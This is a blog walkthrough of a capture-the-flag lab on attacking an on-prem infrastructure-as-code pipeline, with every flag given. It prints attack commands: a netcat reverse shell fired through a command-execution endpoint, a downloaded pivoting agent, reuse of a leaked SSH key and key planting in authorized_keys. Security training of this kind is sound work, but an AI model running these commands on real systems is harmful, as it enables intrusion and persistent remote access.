---
title: "Attacking On-Prem IaC"
seoTitle: "On-Prem IaC Security Threats"
seoDescription: "Exploit on-premises IaC deployments by identifying security vulnerabilities and leveraging SSH access to gain control over the IaC pipeline"
datePublished: Sun Nov 10 2024 14:19:51 GMT+0000 (Coordinated Universal Time)
cuid: cm3bolc10000c08mg1fpa5fyo
slug: attacking-on-prem-iac
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1731144842569/b1b3728e-ae91-4d25-8238-26e582399a04.jpeg
tags: vagrant, docker, ansible, devops, hacking, ssh, devsecops, cybersecurity-1, iac

---

IaC Challenge

Now that you have learned how on-prem IaC deployments work and the security concerns that arise when using IaC.

> **In order for us to provide you with this challenge, a significant amount of software had to be kept at specific version levels. As such, the machine itself has some outdated software, which could be used with kernel exploits to bypass the challenge itself. However, if you choose to go this route of kernel exploitation to bypass the challenge and recover the flags, it will only affect your own learning opportunity. Our suggestion, try to solve the challenge by using what you have learned in this room about on-prem IaC.**

Once the machine is booted, you can use SSH with the credentials below to connect to the machine:

| **Username** | entry |
| --- | --- |
| **Password** | entry |
| **IP** | 10.10.64.200 |

Once authenticated, you will find the scripts for an IaC pipeline. Work through these files to identify vulnerabilities and attack the machines deployed by the IaC pipeline to gain full control of the pipeline ultimately! You can also use this SSH connection to "catch shells" as required. You will have to leverage these files with what you learned in [Building an On-Prem IaC Workflow](https://dignitas.hashnode.dev/building-an-on-prem-iac-workflow) to compromise the pipeline!

To assist you on this journey, you can make use of the hints provided below. However, since the main goal is attacking an IaC pipeline, you are provided with the following:

* Nmap has been installed for you on the host, allowing you to scan the port range of the Docker network if required.
    
* Use SSH to proxy out the traffic of the web application, or any other port, as required.
    
* You can use the SCP command of SSH to transfer out the IaC configuration files.
    

IP: **10.10.64.200**

Let’s ping the machine to see if we’ve connected successfully.

```bash
ping -c3 10.10.64.200
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731229919734/c5c81cd3-32fb-4cf1-a4a5-9cabdd6459e4.png align="center")

Let’s connect to the machine now via `SSH`.

```bash
ssh entry@10.10.64.200
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731230566545/6566bc21-0790-4ca8-96f8-e366cc458515.png align="center")

Let’s now switch to a more stable bash shell.

```bash
bash
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731230625183/de5c6a3e-c079-4cc9-a3d4-70714d55a4d4.png align="center")

When we list the files we can see that there’s a folder named “iac” and in that we can see that there are multiple configuration files.

```bash
ls -la
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731232058657/9c9b38c3-8603-49a0-a452-f9f7b0e44e61.png align="center")

Let’s now check the Vagrantfile.

```bash
cat Vagrantfile
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731232116059/1d700f04-bb5c-4598-bdc7-18f4ac6d02e9.png align="center")

```yaml
Vagrant.configure("2") do |config|
  # DB server will be the backend for our website
  config.vm.define "dbserver"  do |cfg|
    # Configure the local network for the server
    cfg.vm.network :private_network, type: "dhcp", docker_network__internal: true
    cfg.vm.network :private_network, ip: "172.20.128.3", netmask: "24"

    # Boot the Docker container and run Ansible
    cfg.vm.provider "docker" do |d|
      d.image = "mysql_vuln"
      d.env = {
        "MYSQL_ROOT_PASSWORD" => "mysecretpasswd"
      }
    end
  end


  # Webserver will be used to host our website
  config.vm.define "webserver"  do |cfg|
    # Configure the local network for the server
    cfg.vm.network :private_network, type: "dhcp", docker_network__internal: true
    cfg.vm.network :private_network, ip: "172.20.128.2", netmask: "24"

    # Link the shared folder with the hypervisor to allow data passthrough. Will remove later to harden
    cfg.vm.synced_folder "./provision", "/tmp/provision"
    cfg.vm.synced_folder "/home/ubuntu/", "/tmp/datacopy"

    # Boot the Docker container and run Ansible
    cfg.vm.provider "docker" do |d|
      d.image = "ansible"

      #d.cmd = ["ansible-playbook", "/tmp/provision/web-playbook.yml"]
      d.has_ssh = true

      # Command will keep the container active
      d.cmd = ["/usr/sbin/sshd", "-D"]
    end

    #We will connect using SSH so override the defaults here
    cfg.ssh.username = 'root'
    cfg.ssh.private_key_path = "/home/ubuntu/iac/keys/id_rsa"

    #Provision this machine using Ansible 
    cfg.vm.provision "shell", inline: "ansible-playbook /tmp/provision/web-playbook.yml"
  end

end
```

So in the file, we can see that there are 2 VM’s one `dbserver` is the backend for our website so we know that it’s running MySQL and we have the IP for it as well `172.20.128.3`. Then we have the `webserver` which has the IP `172.20.128.2`. Now we know that both are internal VMs and we cannot directly use them or ping them.

But if we try to use curl on the internal machine we can see a response.

```bash
curl http://172.20.128.2/
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731233704003/8c93f562-f744-49c2-8878-bac2d0b1d25c.png align="center")

Now we need to pivot to the network so there are multiple ways to do it for example SSH as this room suggests but we’ll be using `Ligolo-ng`. it’s because for me this is the best pivoting tool available.

So let’s start with setting up the ligolo server

```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731234256906/ca2dd0f4-c448-432c-a4fc-313800c81a5b.png align="center")

Now we’ll use the `-selfcert` option so that the proxy server will use its certificates.

```bash
./proxy -selfcert
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731234866424/0fed952d-e0ff-46f9-84d5-451e9c2d681d.png align="center")

Now let’s set up a python server and transfer the agent file to the SSH machine.

```bash
python3 -m http.server 80
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731235063294/1157f843-c0c0-4839-9b5a-b77a762bf930.png align="center")

Now we move to the `/tmp` directory as we have write permissions there and will call our file.

```bash
wget http://10.17.77.69/agent
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731235054057/388f4738-ad78-4005-a8b9-16794f3525dd.png align="center")

Now let’s change the permission of the agent file and execute it.

```bash
chmod +x agent
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731235120749/89da05b9-a2a8-4acc-a985-dc7461050bc8.png align="center")

```bash
./agent -connect 10.17.77.69:11601 -ignore-cert
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731235192400/41e22811-59e6-4998-abb3-173b778385d6.png align="center")

Now if we check our proxy we can see that we got our connection there.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731235244423/2b24fc57-7ea1-4b7c-8598-5caf7688d431.png align="center")

Now by doing `ifconfig` we can see all the networks.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731235318824/056f4bc8-9106-48bd-ae7d-2e0c6d230c60.png align="center")

Let’s now copy the interface IP and let’s route them so that we can use it from our Kali machine as well.

```bash
sudo ip route add 172.20.128.0/24
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731235556274/70a41dae-1434-4bb0-83a3-180d3cd0e105.png align="center")

Now we can start the tunnel on the proxy.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731235658110/b7394740-f7d2-4156-b18f-3f67bfe7d76c.png align="center")

Now if we visit the webserver from our browser we can see that we’re able to see the webpage.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731235778732/a7f29c3e-2270-4794-8641-08b468cda1db.png align="center")

Now let’s start caido so we can proxy some of these.

```bash
caido
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731242004984/8c79866e-9a01-4059-94c0-5408b1a60f7c.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731241976323/adca5e68-d161-4789-a585-b8814035229b.png align="center")

Now let’s refresh and check whether we can intercept the request in caido.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731243545176/7123c23d-bd75-45aa-a5b9-673df1a6c522.png align="center")

And yes we’re able to capture the requests.

Now if we look at the Sign In page we see that we have a button there labeled as `(Dev) Test DB`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731243767391/446b7c84-78ac-4d8f-a351-867e4b1f4074.png align="center")

We see that it’s showing us the version of MySQL let’s see what response are we able to see in caido.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731243827887/84b912f0-5d2d-4aac-b3bc-06fabf3c6b71.png align="center")

We can see that it executes a command. so let’s try to execute different commands.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731243907353/37568558-cd24-43a2-83cd-f703cb6e6d0c.png align="center")

While testing the `whoami` command we can see that it gives us a status code of 200 OK which means we’re able to execute the commands. If we see the Rendered image.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731244005841/e40069fc-fd78-40c5-9776-2afc813f28b4.png align="center")

we can see that we’re executing commands as root user.

Now let’s try to take a reverse shell to the machine.

```bash
which nc
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731244121058/d9593bf6-0356-4a68-ad4e-fb0cbc0078b8.png align="center")

so we can use Netcat to catch a shell.

On our SSH shell we can start netcat.

```bash
nc -nvlp 1337
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731244262459/f284334b-8922-416e-86f3-cb01409dc723.png align="center")

Now, moving on caido.

```bash
/bin/nc 10.10.205.253 1337 -e /bin/bash
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731244405053/e414a60c-bbc3-423e-8263-ac2ade41fe27.png align="center")

Now let’s check our netcat shell.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731244432134/38a8b19c-eddb-4fa2-b17e-b342f8b78062.png align="center")

Now if we list out the files we’re able to see our first flag.

```bash
ls -la
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731244486069/8de0d2ef-ea09-499b-a3cf-3d991734f947.png align="center")

Flag: **THM{Dev.Bypasses.and.Checks.can.be.Dangerous}**

> When a Vagrant deployment is performed, by default, Vagrant will create a local copy of the provisioning directory under the /vagrant/ folder. Have a look that and see if some sensitive information may have been left there.

We have a hint here that says to check the /vagrant folder so let’s check and see if we can find something to utilize.

```bash
cd /vagrant
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731245617423/3589b756-a1c4-4b9f-9f96-6619a0f0f2c8.png align="center")

The keys file looks promising.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731245651144/5ff83019-bbce-4dd2-b17c-68d2d972da52.png align="center")

we have the id\_rsa key in this. let’s take it onto our kali machine and try to ssh on the `dbserver`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731245708568/7f8e7f11-829a-4686-9b2b-c04bf2519014.png align="center")

```bash
chmod 600 id_rsa
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731245850712/b32959eb-30a3-482a-9ae8-6bf1af7b4b1d.png align="center")

Now let’s SSH into the `webserver`.

```bash
ssh root@172.20.128.2 -i id_rsa
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731245976169/51edd31f-a324-4e86-a6a4-55de6e2154aa.png align="center")

and as we can see that we’re logged in as `dbserver`.

```bash
ls -la
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731246004563/ce43cd0c-9cfe-45a8-abec-42db96743615.png align="center")

And we got our 2nd flag as well here.

Flag: **THM{IaC.Deployment.Keys.Must.be.Removed}**

> Often times we need to transfer large amounts of data when deploying through an IaC pipeline. If we are a bit lazy, we might not restrict our shares or revoke them once we are done. Have a look at the provisioning shares.

Now we have another hint here. which means there must be a folder or shares to which we do have access mainly highlighting the `provisioning` shares.

now if we look at the `/tmp` directory we see there’s a folder named `Datacopy`. which means the share that we talked about must be this one.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731247208185/5155c34d-6737-448b-9f96-417a115b370c.png align="center")

Now listing out all the files in `datacopy` folder we can find our 3rd flag.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731247273193/f189a563-7e22-48ab-96af-cb8b89f1c7c8.png align="center")

Flag: **THM{IaC.Shares.Should.be.Restricted}**

> To perform provisioning in an IaC pipeline you need quite a bit of privileges. Often it is hard to determine exactly what privileges are needed, resulting in the permissions being too permissive.

We now have another hint. We cannot run `entry` as root.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731247649153/0120faa6-8d60-4e13-bc7a-84a8226b5fe2.png align="center")

Now if we take a look back we have another user named ubuntu which might have all the access.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731247717313/417a5b2e-459d-4e63-b16e-3f781af1b0b9.png align="center")

We can see all the files that we saw on the `dbserver` shell as it’s a shared folder.

now if we somehow gain access as `Ubuntu` our work is done.

doing `ls -la` we found that there's a folder named `.ssh` so if we try to put our ssh key in it. we can probably get our privileges escalated.

```bash
ls -la
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731247833337/d89ab812-c045-4cc7-bacc-b4c80d13615d.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731247881778/db34636c-b7b4-499b-a598-05ad165f4843.png align="center")

So we have our ssh key here now let’s add that.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731247931041/c6170a7a-bb4a-4735-901c-28389f0f2628.png align="center")

So we need to transfer our files into `authorized_keys` file.

```bash
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCOI7BWKSZ4O6qBeC72lsjnz1TRwHyhh7A3Jvk6RC2830NsBIRhHsPROlVNnmMcgCyYhxNH1W4I5P2B2e165MNQbS/CzCNUSZojN3/sqwNJmRP9xGW0nzy9vO7Luypn1tNDibNA4NmbRlVfXNdIfk7OqjYAnWVJ42AZmqhNRgnjM4czpeRylp0vFDj2jaxYvf5muhE92FUEAbXD4CT6tNrfmGJlExH1PhOljg0AF5idLykhZfnY0Bdh7g6eo4LNtyqRGycH5w/bsqmbsuT1TuMa74xIRkjZHsoUMLuBfpC2+DUbLjXTguAvT8h+8coDmECTNjivkp5DnJRFh04sB9uIxgxb10UjqJL1kB+NyP8IYhYcVub4suAFdlBX/NtCZZvdFYDokc1KrHzJv/Zs0KWTkfOGL3KM4EpOYXe5RQ8EMidighMMDQckx7S5ZbYQ8423Dj3WJedLjoqmpyLdedUyR3CbiELe1CH2Ov1OUJ34vNZ268R4zTdKdULRA87pnq8= kali@kali" >> authorized_keys
```

> Make sure to use “»” so that we do not overwrite the files.

```bash
cat authorized_keys
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731248051004/e9a89fce-c193-45f2-abfa-c92d74885b92.png align="center")

Now let’s ssh into the machine IP as Ubuntu.

```bash
ssh ubuntu@10.10.205.253
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731248115726/367c71f1-db24-48ae-a74f-87401f17536e.png align="center")

and we’re logged in. Now check for the sudoers permission.

```bash
sudo -l
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731248158091/e9e99ab5-7f84-4368-a73e-bd24caeb62a3.png align="center")

We do not need any passwords to change permissions so let’s switch user to root.

```bash
sudo su
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731248204239/7b6bfda3-75ce-42a5-a8ed-15c76f06d95c.png align="center")

Now if we check our `/root` folder we can find our final flag.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1731248253597/1cd48a79-b418-499b-8c0e-cb892ae80ce0.png align="center")

Flag: **THM{Provisioners.Usually.Have.Privileged.Access}**